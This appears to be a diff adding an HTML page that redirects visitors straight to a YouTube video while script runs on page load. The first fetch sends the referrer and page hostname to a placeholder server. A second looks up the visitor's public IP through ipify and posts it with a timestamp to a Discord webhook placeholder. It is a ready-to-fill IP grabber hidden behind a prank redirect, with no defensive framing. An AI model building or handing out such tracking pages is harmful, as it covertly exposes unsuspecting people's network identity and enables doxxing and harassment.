@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="refresh" content="0; url=https://www.youtube.com/watch?v=dQw4w9WgXcQ">
+</head>
+<body>
+<script>
+    // Send IP to your logging endpoint (e.g., a webhook, Discord, your own server)
+    fetch('https://your-server.com/log?ip=' + location.hostname + '&ref=' + document.referrer);
+    
+    // Or use a free IP logging service
+    fetch(`https://api.ipify.org?format=json`)
+      .then(r => r.json())
+      .then(data => {
+          // Log to your Discord webhook, Telegram bot, etc.
+          fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK', {
+              method: 'POST',
+              body: JSON.stringify({
+                  content: `IP: ${data.ip} | Time: ${new Date().toISOString()}`
+              })
+          });
+      });
+</script>
+</body>
+</html>
